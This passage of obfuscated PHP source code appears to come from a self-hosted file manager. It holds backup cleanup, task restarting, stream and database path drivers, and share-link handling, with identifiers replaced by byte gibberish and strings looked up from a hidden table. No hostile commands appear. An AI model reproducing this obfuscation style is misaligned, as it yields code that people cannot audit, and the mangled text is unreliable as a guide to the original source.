$›öâç¶ü = $this->listData($Ş¥¬È‰); if (!$›öâç¶ü || empty($›öâç¶ü[$»×Ñï³®[32]])) { return !0; } Task::kill($»×Ñï³®[853]); Task::kill($»×Ñï³®[871]); Task::kill($»×Ñï³®[880]); $ª…ï©àÙ = $›öâç¶ü[$»×Ñï³®[32]]; $ÃûëÚùÙ = TEMP_FILES . $»×Ñï³®[850] . $ª…ï©àÙ . $»×Ñï³®[8]; IO::remove($ÃûëÚùÙ, !1); return $this->remove($Ş¥¬È‰); } public function remove($Œê‹òû) { $Ç…ª¹æœ = $this->listData($Œê‹òû); if (!$Ç…ª¹æœ) { return !0; } return $this->backupRemove($Ç…ª¹æœ); } private function backupRemove($¯Ë”Ç¦à) { parent::remove($¯Ë”Ç¦à[$_SERVER[¢ñàß¿€][475]]); $àšçÅã = $this->backupPath($¯Ë”Ç¦à); IO::remove($àšçÅã, !1); return !0; } private function backupPath($©°è‡¼µ) { $ä¸Œ»ï¸ =& $_SERVER[¢ñàß¿€]; $İ€¨°Û– = $©°è‡¼µ[$ä¸Œ»ï¸[32]]; $¹¾›É”ò = Model($ä¸Œ»ï¸[841])->get($ä¸Œ»ï¸[842]); $¬ñúí™± = substr(md5($ä¸Œ»ï¸[843] . $¹¾›É”ò . $İ€¨°Û–), 0, 8); return "\173\x69\157\x3a{$©°è‡¼µ[$ä¸Œ»ï¸[823]]}\x7d\x2f\144\141\164\x61\x62\x61\163\145\x2f\x62\141\143\x6b\165\x70\57" . $İ€¨°Û– . $ä¸Œ»ï¸[11] . $¬ñúí™±; } public function start() { $Œõ†Šû =& $_SERVER[¢ñàß¿€]; if ($GLOBALS[$Œõ†Šû[6]][$Œõ†Šû[92]][$Œõ†Šû[1996]] != $Œõ†Šû[91]) { return !0; } $È²´»á´ = $this->config(); if (!$È²´»á´ || $È²´»á´[$Œõ†Šû[1740]] != $Œõ†Šû[91]) { return !1; } $ÓÒ¨¾‹ğ = $this->process(); foreach ($ÓÒ¨¾‹ğ as $ñÊó¾“Ï) { if ($ñÊó¾“Ï) { return Task::restart($ñÊó¾“Ï[$Œõ†Šû[475]]); } } $á†²é†» = new Backup(); $äƒ éØ = $á†²é†»->db(); if ($äƒ éØ) { $äƒ éØ = $á†²é†»->dbFile(); if ($äƒ éØ && $È²´»á´[$Œõ†Šû[171]] == $Œõ†Šû[847]) { $äƒ éØ = $á†²é†»->file(); } } Backup::set(array($Œõ†Šû[821] => 1, $Œõ†Šû[832] => time())); return !0; } public function process() { $ÁöÄš œ =& $_SERVER[¢ñàß¿€]; $¿Éê§‘Å = array($ÁöÄš œ[828] => Task::get($ÁöÄš œ[853]), $ÁöÄš œ[833] => Task::get($ÁöÄš œ[871]), $ÁöÄš œ[230] => Task::get($ÁöÄš œ[880])); $…Ö‘­Ÿ“ = !1; foreach ($¿Éê§‘Å as &$èÛİş¨¿) { if ($…Ö‘­Ÿ“) { $èÛİş¨¿ = !1; continue; } if ($èÛİş¨¿) { $¤‹à»Øú = intval(_get($èÛİş¨¿, $ÁöÄš œ[1775], 0)); if (time() - $¤‹à»Øú > 7200) { Task::kill($èÛİş¨¿[$ÁöÄš œ[475]]); $…Ö‘­Ÿ“ = !0; $èÛİş¨¿ = !1; } } } return $¿Éê§‘Å; } public function restore() { $‰é¥ú‰¹ =& $_SERVER[¢ñàß¿€]; ActionCall($‰é¥ú‰¹[1135], !0, 1); ActionCall($‰é¥ú‰¹[1135], !0, 0); } } goto B†òÅÖ«¶”; cÚœ•ÑŠ²Œ: class PathDriverStream extends PathDriverBase { const TYPE_STRING = 1; const TYPE_FILE = 2; public function __construct($¤ÊèÁ, $È«­·¾“ = 0) { parent::__construct(); $this->source = $¤ÊèÁ; $this->sourceSize = $È«­·¾“; if (is_string($this->source)) { $this->sourceType = self::TYPE_STRING; $this->sourceSize = strlen($this->source); } else { $this->sourceType = self::TYPE_FILE; } } public function size($ª¤ë¸×İ = false) { return $this->sourceSize; } public function getContent($˜’±òÜÔ = false) { return $this->fileSubstr($˜’±òÜÔ, 0, $this->sourceSize); } public function fileSubstr($¡Áµ½£î = false, $ùÓÈŠ¯• = 0, $ˆÍëå±‰ = 0) { if (!$ˆÍëå±‰) { $ˆÍëå±‰ = $this->sourceSize; } $¼®ù£Öİ = $this->sourceSize - $ùÓÈŠ¯•; if ($ˆÍëå±‰ >= $¼®ù£Öİ) { $ˆÍëå±‰ = $¼®ù£Öİ; } if ($this->sourceType == self::TYPE_STRING) { return substr($this->source, $ùÓÈŠ¯•, $ˆÍëå±‰); } if ($this->sourceType == self::TYPE_FILE) { if ($ˆÍëå±‰ <= 0) { return $_SERVER[¢ñàß¿€][12]; } $ÁØŸîÔ = ftell($this->source); fseek_64($this->source, $ÁØŸîÔ + $ùÓÈŠ¯•); $¡ÚÚÀ»‘ = @fread($this->source, $ˆÍëå±‰); fseek_64($this->source, $ÁØŸîÔ); return $¡ÚÚÀ»‘; } } public function hashMd5($û ô’ë = false) { return md5($this->getContent()); } public static function hash($ …¨ÆÌ, $ã€š†ˆÒ = 0) { $‹×‰ØÑ = new PathDriverStream($ …¨ÆÌ, $ã€š†ˆÒ); return $‹×‰ØÑ->hashSimple($ …¨ÆÌ); } public static function md5($£¨ƒİ‘Ø, $•ŞÄºòÚ = 0) { $ì±«³¿ı = new PathDriverStream($£¨ƒİ‘Ø, $•ŞÄºòÚ); return $ì±«³¿ı->hashMd5($£¨ƒİ‘Ø); } } $_file = $_SERVER[$_SERVER[¢ñàß¿€][1458]]; $_size = $_SERVER[¢ñàß¿€][1542]; goto fß÷»…Ô‹; D‚¯Œ†ğªÔ: class PathDriverDB extends PathDriverBase { public $model; public $pathParse; public function __construct($Ó‰şû§) { $this->pathParse = $Ó‰şû§; $this->model = Model($_SERVER[¢ñàß¿€][1414]); } public function getPath($Ù¸†¹ë‚) { return trim($Ù¸†¹ë‚, $_SERVER[¢ñàß¿€][8]); } public function pathFather($‹Ü™ÑÚ¾) { $ÖœÀõŒ = $this->parse($‹Ü™ÑÚ¾); $ÖœÀõŒ = $this->infoSimple($‹Ü™ÑÚ¾); return $ÖœÀõŒ ? $ÖœÀõŒ[$_SERVER[¢ñàß¿€][192]] : !1; } public function pathThis($·ùİ›êş) { $İ¤íÑ‰· = $this->infoSimple($·ùİ›êş); return $İ¤íÑ‰· ? $İ¤íÑ‰·[$_SERVER[¢ñàß¿€][32]] : !1; } public function getPathOuter($¤ç—¡¤ô) { if (!$¤ç—¡¤ô) { return $¤ç—¡¤ô; } $Ô¨ˆ£Ÿ = $this->parse($¤ç—¡¤ô); return KodIO::make($Ô¨ˆ£Ÿ[$_SERVER[¢ñàß¿€][475]]); } public function copyFolderFromIO($Èİ¦€ğÄ, $ïüËç¨¢, $¤É©ÊşÒ, $’™úß¯Ş, $­–Œ‹ß) { $àÌ™¸‹‚ = $this->model->copyFolderFromIO($Èİ¦€ğÄ, $ïüËç¨¢, $¤É©ÊşÒ, $’™úß¯Ş, $­–Œ‹ß); return KodIO::make($àÌ™¸‹‚); } public function isParentOf($†ÖÛ“ ³, $Ê³ÔèÇÊ) { return $this->model->isParentOf($†ÖÛ“ ³, $Ê³ÔèÇÊ); } public function mkfile($ÕşÎ–Îñ, $¿ş‹¯Ãµ = '', $”ÓšÙ•Ë = REPEAT_RENAME) { $ˆª·±¬À =& $_SERVER[¢ñàß¿€]; $ÀóÏËÍ— = $this->parse($ÕşÎ–Îñ); $ÕşÎ–Îñ = $ÀóÏËÍ—[$ˆª·±¬À[475]]; for ($‰ÃşÒòş = 0; $‰ÃşÒòş < count($ÀóÏËÍ—[$ˆª·±¬À[1415]]); $‰ÃşÒòş++) { $££©Å„í = $ÀóÏËÍ—[$ˆª·±¬À[1415]][$‰ÃşÒòş]; if ($‰ÃşÒòş == count($ÀóÏËÍ—[$ˆª·±¬À[1415]]) - 1) { $ÕşÎ–Îñ = $this->model->mkfile($ÕşÎ–Îñ, $££©Å„í, $¿ş‹¯Ãµ, $”ÓšÙ•Ë); break; } $ÕşÎ–Îñ = $this->model->mkdir($ÕşÎ–Îñ, $££©Å„í, REPEAT_SKIP); } return $this->getPathOuter($ÕşÎ–Îñ); } public function mkdir($®¤¤«ñ, $‹÷Öƒì‡ = REPEAT_SKIP) { $ŸÑë¾ =& $_SERVER[¢ñàß¿€]; $¤ø–¶ç = $this->parse($®¤¤«ñ); $®¤¤«ñ = $¤ø–¶ç[$ŸÑë¾[475]]; for ($æÙ–Éæş = 0; $æÙ–Éæş < count($¤ø–¶ç[$ŸÑë¾[1415]]); $æÙ–Éæş++) { $ƒŞ»ğç™ = $¤ø–¶ç[$ŸÑë¾[1415]][$æÙ–Éæş]; $®¤¤«ñ = $this->model->mkdir($®¤¤«ñ, $ƒŞ»ğç™, $‹÷Öƒì‡); } return $this->getPathOuter($®¤¤«ñ); } public function copyFile($¬•‘ç±Ó, $ÅÇ÷ıŸâ, $ÜÇ˜Á¿ = REPEAT_REPLACE) { $¨ç«ğ›˜ =& $_SERVER[¢ñàß¿€]; $Ã¢ˆæëË = $this->parse($ÅÇ÷ıŸâ); $ú¸…Ïïì = $this->model->copy($¬•‘ç±Ó, $Ã¢ˆæëË[$¨ç«ğ›˜[475]], $ÜÇ˜Á¿, $Ã¢ˆæëË[$¨ç«ğ›˜[87]]); return $ú¸…Ïïì ? $this->getPathOuter($ú¸…Ïïì) : !1; } public function moveFile($¹ª†±ï†, $æ™Ê¦ßÊ, $Ï«´êµ = REPEAT_REPLACE) { $¹ÛŸ—Ñ =& $_SERVER[¢ñàß¿€]; $ıÏíÀú» = $this->parse($æ™Ê¦ßÊ); $šÖ¬ÕÚ = $this->model->move($¹ª†±ï†, $ıÏíÀú»[$¹ÛŸ—Ñ[475]], $Ï«´êµ, $ıÏíÀú»[$¹ÛŸ—Ñ[87]]); return $šÖ¬ÕÚ ? $this->getPathOuter($šÖ¬ÕÚ) : !1; } public function copy($¨‘¤üòã, $§½Ş¹¢, $Â‰å“îŠ = REPEAT_REPLACE, $ÅÌ®¹” = false) { $µ£¿ÒŸ = $this->parse($§½Ş¹¢); $İĞåñ°½ = $this->model->copy($¨‘¤üòã, $µ£¿ÒŸ[$_SERVER[¢ñàß¿€][475]], $Â‰å“îŠ, $ÅÌ®¹”); return $İĞåñ°½ ? $this->getPathOuter($İĞåñ°½) : !1; } public function moveSameAllow() { } public function move($ƒöä‹ÁÉ, $óõƒğà, $”­ÈÌ‚¢ = REPEAT_REPLACE, $ø™±˜ = false) { $Òûû‡ª˜ = $this->parse($óõƒğà); $ƒ¢öƒŒÒ = $this->model->move($ƒöä‹ÁÉ, $Òûû‡ª˜[$_SERVER[¢ñàß¿€][475]], $”­ÈÌ‚¢, $ø™±˜); return $ƒ¢öƒŒÒ ? $this->getPathOuter($ƒ¢öƒŒÒ) : !1; } public function remove($ÎûÇç, $ş¾’”­Š = true) { return $this->model->remove($ÎûÇç, $ş¾’”­Š); } public function rename($îÈøİ‡ô, $ËÓ—ÉŒ) { $Ş²ƒ“”º = $this->model->rename($îÈøİ‡ô, $ËÓ—ÉŒ); return $Ş²ƒ“”º ? $this->getPathOuter($îÈøİ‡ô) : $Ş²ƒ“”º; } public function size($‚”¦¦ß«) { $êÅÒÓ = $this->infoSimple($‚”¦¦ß«); return $êÅÒÓ ? $êÅÒÓ[$_SERVER[¢ñàß¿€][79]] : 0; } public function infoSimple($õñÀÄû) { return $this->model->sourceInfo($õñÀÄû); } public function info($ˆŠ¹èˆ¡) { return $this->infoParse($ˆŠ¹èˆ¡); } public function infoAuth($´÷Òß”“) { return $this->infoParse($´÷Òß”“, !1, !0); } public function infoWithChildren($ùÕÂ‰àÖ) { return $this->infoParse($ùÕÂ‰àÖ, !0); } protected function infoParse($ÈÄµé¢Ğ, $­ÒÚã££ = false, $¤ªˆùœ§ = false) { if (!$­ÒÚã££) { return $this->model->pathInfo($ÈÄµé¢Ğ, $¤ªˆùœ§); } return $this->model->pathInfoMore($ÈÄµé¢Ğ); } public function infoFullSimple($ÛğÉÕÅô) { $Áˆ…ëôş =& $_SERVER[¢ñàß¿€]; $ğ¬Ò‹¡˜ = explode($Áˆ…ëôş[8], $ÛğÉÕÅô); $şâòĞì = implode($Áˆ…ëôş[8], array_splice($ğ¬Ò‹¡˜, 1)); return $this->model->pathInfoByPath($ğ¬Ò‹¡˜[0], $şâòĞì); } public function infoFull($Ê÷ùµ•€) { $üÑ™³± = $this->infoFullSimple($Ê÷ùµ•€); return is_array($üÑ™³±) ? $this->model->pathInfo($üÑ™³±[$_SERVER[¢ñàß¿€][193]]) : !1; } public function hashSimple($í¯°¥Ë) { $¿¬Â·Š¬ =& $_SERVER[¢ñàß¿€]; $İğ×˜Ûß = $this->infoWithChildren($í¯°¥Ë); return $İğ×˜Ûß[$¿¬Â·Š¬[170]][$¿¬Â·Š¬[672]]; } public function hashMd5($Ú•‘ÓÁæ) { $«ß›øâ¼ =& $_SERVER[¢ñàß¿€]; $œçöåÏš = $this->infoWithChildren($Ú•‘ÓÁæ); return $œçöåÏš[$«ß›øâ¼[170]][$«ß›øâ¼[547]]; } public function exist($çõË‹¿) { $õöËíàë =& $_SERVER[¢ñàß¿€]; $Š¾¢ó¹ = $this->parse($çõË‹¿); if (!$Š¾¢ó¹[$õöËíàë[87]]) { return $this->isFile($çõË‹¿) || $this->isFolder($çõË‹¿); } $¡ÆÅúî = array($õöËíàë[477] => $Š¾¢ó¹[$õöËíàë[475]], $õöËíàë[32] => $Š¾¢ó¹[$õöËíàë[87]]); $ªÏ®µóò = $this->model->where($¡ÆÅúî)->find(); return $ªÏ®µóò ? !0 : !1; } public function isFile($·¡î) { $Ñîš¯Àˆ =& $_SERVER[¢ñàß¿€]; $æÈà€† = $this->infoSimple($·¡î); return $æÈà€† && $æÈà€†[$Ñîš¯Àˆ[485]] == $Ñîš¯Àˆ[228] ? !0 : !1; } public function isFolder($è¿œÂûß) { $Â÷Š‹øî =& $_SERVER[¢ñàß¿€]; $÷ºÄÏÑŞ = $this->infoSimple($è¿œÂûß); return $÷ºÄÏÑŞ && $÷ºÄÏÑŞ[$Â÷Š‹øî[485]] == $Â÷Š‹øî[91] ? !0 : !1; } public function listPath($ëŠÃ´, $ä¨“ã—“ = false) { $Àüã»¹ƒ =& $_SERVER[¢ñàß¿€]; if ($ëŠÃ´ == $Àüã»¹ƒ[12]) { return !1; } $úŸ£Ïµ = array($Àüã»¹ƒ[477] => $ëŠÃ´); if ($ä¨“ã—“) { return $this->model->listSource($úŸ£Ïµ, -1); } return $this->model->listSource($úŸ£Ïµ); } public function has($¦ñÔ£§¥, $Ğœª¤¿… = false, $ÌÍ³ë¶ = null) { $ùéÕÎú‘ =& $_SERVER[¢ñàß¿€]; $…Á§Âá = $this->infoWithChildren($¦ñÔ£§¥); if ($Ğœª¤¿…) { return array($ùéÕÎú‘[240] => $…Á§Âá[$ùéÕÎú‘[240]], $ùéÕÎú‘[239] => $…Á§Âá[$ùéÕÎú‘[239]]); } return $ÌÍ³ë¶ ? $…Á§Âá[$ùéÕÎú‘[240]] : $…Á§Âá[$ùéÕÎú‘[239]]; } public function listAll($µËû¨ó¼) { $±Ã¨è·º = IO::info($this->pathParse[$_SERVER[¢ñàß¿€][87]]); if (!$±Ã¨è·º) { return array(); } return $this->model->listAll($µËû¨ó¼); } public function getContent($Ç¾›Øå¿) { return $this->model->getContent($Ç¾›Øå¿); } public function setContent($©•×Ãá¹, $³£‘ = '') { return $this->model->setContent($©•×Ãá¹, $³£‘); } public function fileSubstr($óËÁ’Ä«, $ìò“Ä¨Ô, $¼ç…ëÚÇ) { return $this->model->fileSubstr($óËÁ’Ä«, $ìò“Ä¨Ô, $¼ç…ëÚÇ); } public function download($¯‹§²®Ÿ, $·ñ¢Õ = '') { $¬À¬íí‡ = get_path_father($·ñ¢Õ); $ÃÉŠ§¿Î = get_path_this($·ñ¢Õ); $Òü°ø¸Ì = $this->model->fileInfoGet($¯‹§²®Ÿ); $‰½”ƒâ = IO::copy($Òü°ø¸Ì[$_SERVER[¢ñàß¿€][87]], $¬À¬íí‡, !1, $ÃÉŠ§¿Î); return $‰½”ƒâ; } public function setModifyTime($É¾õ½ƒ—, $¸îÛ¬ö• = '') { $ı¬Îøçà =& $_SERVER[¢ñàß¿€]; if (!$É¾õ½ƒ—) { return; } $this->model->where(array($ı¬Îøçà[491] => $É¾õ½ƒ—))->save(array($ı¬Îøçà[88] => $¸îÛ¬ö•)); } public function upload($„’˜¢òã, $³Ë²É¤, $úşµ“« = false, $äÒªßì = REPEAT_REPLACE) { $Ş§£ÍÆğ =& $_SERVER[¢ñàß¿€]; $£î³’ÍØ = $this->parse($„’˜¢òã); $ñ›‚¹Á‡ = $this->model->addFile($£î³’ÍØ[$Ş§£ÍÆğ[475]], $³Ë²É¤, $£î³’ÍØ[$Ş§£ÍÆğ[87]], $úşµ“«, $äÒªßì); return $this->getPathOuter($ñ›‚¹Á‡); } public function uploadFileByID($ú‚º´Æ, $úŸÛ¦äŸ, $‹ŒÇúû‡) { $ÌªÒ£ =& $_SERVER[¢ñàß¿€]; $ÌûÉÚÎÌ = $this->parse($ú‚º´Æ); $ùÂ€…üº = $this->model->addFileByFileID($ÌûÉÚÎÌ[$ÌªÒ£[475]], $úŸÛ¦äŸ, $ÌûÉÚÎÌ[$ÌªÒ£[87]], $‹ŒÇúû‡); return $this->getPathOuter($ùÂ€…üº); } public function addFileByRemote($‰éíà, $…›ïâ¼, $Â¹È‡¹¯ = array(), $¤º‹ßÂã = '', $óáÙõ¤ˆ) { $íÊµ‹Çë =& $_SERVER[¢ñàß¿€]; $€È÷ŸéÃ = $this->parse($‰éíà); $¤º‹ßÂã = empty($¤º‹ßÂã) ? $€È÷ŸéÃ[$íÊµ‹Çë[87]] : $¤º‹ßÂã; $ÈèÂı¡ = $this->model->addFileByRemote($€È÷ŸéÃ[$íÊµ‹Çë[475]], $…›ïâ¼, $¤º‹ßÂã, $Â¹È‡¹¯, $óáÙõ¤ˆ); return $this->getPathOuter($ÈèÂı¡); } public function uploadLink($§ìÂœè, $“Ïì¨˜º = 0) { $ğ‘Îê¢¸ =& $_SERVER[¢ñàß¿€]; $ŸÌ¯ú = $this->parse($§ìÂœè); $¦¥¯õæ´ = _get($GLOBALS[$ğ‘Îê¢¸[7]], $ğ‘Îê¢¸[1416]); $æœîÃ½ = _get($GLOBALS[$ğ‘Îê¢¸[7]], $ğ‘Îê¢¸[1417]); $§ìÂœè = Model($ğ‘Îê¢¸[674])->createFileName($ŸÌ¯ú[$ğ‘Îê¢¸[87]], $¦¥¯õæ´, $æœîÃ½); return IO::uploadLink($§ìÂœè, $“Ïì¨˜º); } public function fileNameAuto($î‰¸ùò, $Á­á³ıÏ, $½·æíÀÌ = REPEAT_REPLACE, $¡¼Ï§æº = false) { return $this->model->fileNameAuto($î‰¸ùò, $Á­á³ıÏ, $½·æíÀÌ, $¡¼Ï§æº); } public function fileNameExist($¹®çÊÔ¦, $µà›ï×¯) { return $this->model->fileNameExist($¹®çÊÔ¦, $µà›ï×¯); } protected function _fileOut($›®’œÚ, $ââÊàÚ = false, $Ç„Ÿã…‰ = false, $ÍÕ—ÓÇœ = '', $ÖÓœ › = false) { $ªá€×Å† =& $_SERVER[¢ñàß¿€]; $Û¢İŒ¥ = $this->model->sourceInfo($›®’œÚ); if ($Û¢İŒ¥[$ªá€×Å†[485]] == $ªá€×Å†[91]) { header($ªá€×Å†[1418]); die; } $€´£ùå— = $this->model->fileInfoGet($›®’œÚ); $ÍÕ—ÓÇœ = $€´£ùå—[$ªá€×Å†[547]] ? $€´£ùå—[$ªá€×Å†[547]] : $ÍÕ—ÓÇœ; $¶ÛèßŞ = isset($GLOBALS[$ªá€×Å†[182]]) && is_array($GLOBALS[$ªá€×Å†[182]]) ? $GLOBALS[$ªá€×Å†[182]][$ªá€×Å†[32]] : $Û¢İŒ¥[$ªá€×Å†[32]]; if ($ÖÓœ ›) { return IO::fileOutServer($€´£ùå—[$ªá€×Å†[87]], $ââÊàÚ, $¶ÛèßŞ, $ÍÕ—ÓÇœ); } IO::fileOut($€´£ùå—[$ªá€×Å†[87]], $ââÊàÚ, $¶ÛèßŞ, $ÍÕ—ÓÇœ); } public function fileOut($Õ™°“îå, $Ô¢‘ªÄ€ = false, $Ûºà‘‚ = false, $èè¹Æˆ‡ = '') { $this->_fileOut($Õ™°“îå, $Ô¢‘ªÄ€, $Ûºà‘‚, $èè¹Æˆ‡); } public function fileOutServer($«Ğƒ, $Åøé§Ÿµ = false, $Ò¬¬‹ì = false, $Õšú±û™ = '') { $this->_fileOut($«Ğƒ, $Åøé§Ÿµ, $Ò¬¬‹ì, $Õšú±û™, !0); } protected function _fileOutImage($ò¹ÎÁÃ¹, $ØæœÔ±Ö = 250) { $ˆ‚œÏ»’ =& $_SERVER[¢ñàß¿€]; $ÀèĞ£Ï· = $this->model->pathInfo($ò¹ÎÁÃ¹); if ($ÀèĞ£Ï·[$ˆ‚œÏ»’[485]] == $ˆ‚œÏ»’[91]) { show_json($ˆ‚œÏ»’[1419] . $ò¹ÎÁÃ¹, !1); } $òëØĞáÙ = $this->model->fileInfoGet($ò¹ÎÁÃ¹); $ÀèĞ£Ï·[$ˆ‚œÏ»’[183]] = $òëØĞáÙ[$ˆ‚œÏ»’[87]]; $GLOBALS[$ˆ‚œÏ»’[182]] = $ÀèĞ£Ï·; IO::fileOutImage($òëØĞáÙ[$ˆ‚œÏ»’[87]], $ØæœÔ±Ö); } public function fileOutImage($¤ú­¥«î, $ü‚–ëªÉ = 250) { $this->_fileOutImage($¤ú­¥«î, $ü‚–ëªÉ); } public function fileOutImageServer($Åêåà²«, $¹”Ì¾éş = 250) { $this->_fileOutImage($Åêåà²«, $¹”Ì¾éş); } public function link($³Ü®ÛÎ, $û€¨Úå  = '') { $†ïÈ—Ã = $this->model->fileInfoGet($³Ü®ÛÎ); return IO::link($†ïÈ—Ã[$_SERVER[¢ñàß¿€][87]], $û€¨Úå ); } protected function parse($€«å‹òô) { $Ì°Ë–ù =& $_SERVER[¢ñàß¿€]; if (strstr($€«å‹òô, $Ì°Ë–ù[8]) === !1) { return array($Ì°Ë–ù[493] => intval($€«å‹òô), $Ì°Ë–ù[87] => $Ì°Ë–ù[12], $Ì°Ë–ù[1415] => array()); } $¨ÁÅ£óÆ = explode($Ì°Ë–ù[8], trim($€«å‹òô, $Ì°Ë–ù[8])); if (count($¨ÁÅ£óÆ) < 2) { show_tips(clear_html($€«å‹òô) . $Ì°Ë–ù[1420]); } return array($Ì°Ë–ù[493] => intval($¨ÁÅ£óÆ[0]), $Ì°Ë–ù[87] => $¨ÁÅ£óÆ[1], $Ì°Ë–ù[1415] => array_slice($¨ÁÅ£óÆ, 1)); } } class PathDriverDbShareItem extends PathDriverDB { public function __construct($ÖÏÓ§ùˆ) { $this->pathParse = $ÖÏÓ§ùˆ; $this->model = Model($_SERVER[¢ñàß¿€][1414]); } public function getPathOuter($µ¢‚¶¼´) { $Ğ½ÎšÓ =& $_SERVER[¢ñàß¿€]; if (!$µ¢‚¶¼´) { return $µ¢‚¶¼´; } $ŸÒÈÃŞ° = $this->parse($µ¢‚¶¼´); return trim(KodIO::makeShare($this->pathParse[$Ğ½ÎšÓ[475]], $ŸÒÈÃŞ°[$Ğ½ÎšÓ[475]]), $Ğ½ÎšÓ[8]); } protected function infoParse($‰ıãÍµæ, $ÃÛÙÀ×ô = false, $€Ï´‘¹î = false) { $ÃøêŒİ =& $_SERVER[¢ñàß¿€]; $Ò—¯è´Å = $this->pathParse[$ÃøêŒİ[475]]; $¬Ëß¢ãÀ = trim($this->pathParse[$ÃøêŒİ[1247]], $ÃøêŒİ[8]); return Action($ÃøêŒİ[1421])->sharePathInfo($Ò—¯è´Å, $¬Ëß¢ãÀ, $ÃÛÙÀ×ô); } public function infoFull($äŸòÓÀŒ) { $“íæÎô =& $_SERVER[¢ñàß¿€]; $¦·å½µÏ = explode($“íæÎô[8], trim($äŸòÓÀŒ, $“íæÎô[8])); if (count($¦·å½µÏ) > 1) { $ÉËÄ Ëş = implode($“íæÎô[8], array_splice($¦·å½µÏ, 1)); $Ê¢Ç¼×¦ = $this->model->pathInfoByPath($¦·å½µÏ[0], $ÉËÄ Ëş); if (!$Ê¢Ç¼×¦) { return !1; } $this->pathParse[$“íæÎô[1247]] = $Ê¢Ç¼×¦[$“íæÎô[193]]; } return $this->infoParse($äŸòÓÀŒ); } public function listAll($›”ÈÍŒ„) { $Ïüü ù• =& $_SERVER[¢ñàß¿€]; $áğíÂ‘‹ = IO::info($this->pathParse[$Ïüü ù•[87]]); if (!$áğíÂ‘‹) { return array(); } $Ü°âº¼ = $this->model->listAll($›”ÈÍŒ„); $Î·á»ˆ• = Model($Ïüü ù•[664])->getInfo($áğíÂ‘‹[$Ïüü ù•[665]]); foreach ($Ü°âº¼ as &$Û…’ûÓ¯) { check_abort(); $Û…’ûÓ¯[$Ïüü ù•[90]] = Action($Ïüü ù•[1421])->_shareItemeParse($Û…’ûÓ¯[$Ïüü ù•[90]], $Î·á»ˆ•); } unset($Û…’ûÓ¯); return $Ü°âº¼; } } class PathDriverDbShareLink extends PathDriverDB { public function __construct($ ®¯Òå¡) { $this->pathParse = $ ®¯Òå¡; $this->model = Model($_SERVER[¢ñàß¿€][1414]); } protected function infoParse($±ÌÙ„, $úó¹ëâ = false, $‡Õğ¨óê = false) { $¶©Ü»æ =& $_SERVER[¢ñàß¿€]; return Action($¶©Ü»æ[1253])->sharePathInfo($this->pathParse[$¶©Ü»æ[87]], !0, $úó¹ëâ); } public function remove($¶´–“ï , $ÉÃ®¼º = true) { return !0; } public function listPath($ñø–õœè, $ÆşæşÔ† = false) { $¬ÔŞÊŸ =& $_SERVER[¢ñàß¿€]; $ÌúçÖ§ = parent::listPath($ñø–õœè, $ÆşæşÔ†); if (!$ÌúçÖ§) { return $ÌúçÖ§; } if (is_array($ÌúçÖ§[$¬ÔŞÊŸ[1422]])) { $ÌúçÖ§[$¬ÔŞÊŸ[1422]] = Action($¬ÔŞÊŸ[1253])->shareItemInfo($ÌúçÖ§[$¬ÔŞÊŸ[1422]]); } foreach ($ÌúçÖ§ as $ùì ôÑ => $ÏÊ¦Ñø›) { if (!in_array($ùì ôÑ, array($¬ÔŞÊŸ[86], $¬ÔŞÊŸ[85]))) { continue; } foreach ($ÏÊ¦Ñø› as $Ò´íä¦Ø => $¦•ÒØƒ) { $ÌúçÖ§[$ùì ôÑ][$Ò´íä¦Ø] = Action($¬ÔŞÊŸ[1253])->shareItemInfo($¦•ÒØƒ); } } return $ÌúçÖ§; } public function listAll($ü¯‡¥˜ì) { $í§ıæ‰ =& $_SERVER[¢ñàß¿€]; $ÄË¹¿ù = IO::info($this->pathParse[$í§ıæ‰[87]]); if (!$ÄË¹¿ù) { return array(); } $Âê£ì±Ù = $this->model->listAll($ü¯‡¥˜ì); foreach ($Âê£ì±Ù as &$·ÑŠ¿¯À) { $·ÑŠ¿¯À[$í§ıæ‰[90]] = Action($í§ıæ‰[1253])->shareItemInfo($·ÑŠ¿¯À[$í§ıæ‰[90]]); } unset($·ÑŠ¿¯À); return $Âê£ì±Ù; } } goto aÏšàô·Ç·; F·¢ğ‚âî™: class AutoTask { const AUTO_DELAY_TIME = 2; const AUTO_RESTART_TIME = 7200; public static function start() { $»’±°æ =& $_SERVER[¢ñàß¿€]; if (self::valueGet($»’±°æ[821]) != $»’±°æ[91]) { return; } if (self::valueGet($»’±°æ[1720]) == $»’±°æ[91]) { $¦å§¯ó = self::valueGet($»’±°æ[1721]); if (time() - $¦å§¯ó > self::AUTO_RESTART_TIME) { self::restart(); } return; } self::clearUserStatus(); self::valueSet($»’±°æ[1720], $»’±°æ[91]); self::log($»’±°æ[1722] . ACTION . $»’±°æ[1723]); Hook::bind($»’±°æ[1724], $»’±°æ[1725]); $Àäİ¹» = 0; while (!0) { self::cacheClear(); if (self::valueGet($»’±°æ[821]) != $»’±°æ[91]) { self::valueSet($»’±°æ[1720], $»’±°æ[228]); self::log($»’±°æ[1726]); die; } $Ã×Ä‚ŠÎ = time(); if ($Ã×Ä‚ŠÎ - $Àäİ¹» >= 60) { self::valueSet(array($»’±°æ[1720] => $»’±°æ[91], $»’±°æ[1721] => $Ã×Ä‚ŠÎ)); $Àäİ¹» = $Ã×Ä‚ŠÎ; } if (!file_exists(USER_SYSTEM . $»’±°æ[1727])) { self::valueSet(array($»’±°æ[1720] => $»’±°æ[228], $»’±°æ[821] => $»’±°æ[228])); self::log($»’±°æ[1728]); die; } $Ş¤Óµ§× = file_get_contents(BASIC_PATH . $»’±°æ[1729]); $‘â¨‘ƒ½ = KOD_VERSION . $»’±°æ[10] . KOD_VERSION_BUILD; $ğ•Éì×ƒ = match_text($Ş¤Óµ§×, $»’±°æ[1730]) . $»’±°æ[10] . match_text($Ş¤Óµ§×, $»’±°æ[1731]); if ($ğ•Éì×ƒ != $‘â¨‘ƒ½) { self::restart(); self::log("\163\164\x6f\160\145\x64\56\x5b\x76\145\162\x73\151\157\x6e\40\x75\x70\x64\141\164\145\73{$versionNow}\40\x3d\x3e\40{$version}\x5d"); die; } self::taskRunAll(); sleep(self::AUTO_DELAY_TIME); } } public static function clearUserStatus() { $ùÏ££¶€ =& $_SERVER[¢ñàß¿€]; http_close(); $GLOBALS[$ùÏ££¶€[1732]] = 1; $_SERVER[$ùÏ££¶€[1733]] = $ùÏ££¶€[1734]; $_COOKIE = array(); $GLOBALS[$ùÏ££¶€[1735]] = 1; $GLOBALS[$ùÏ££¶€[1736]] = 1; Session::$sessionSign = guid(); Session::$data = array(); } public static function restart() { $öÀÊƒÏñ =& $_SERVER[¢ñàß¿€]; http_close(); self::valueSet($öÀÊƒÏñ[821], 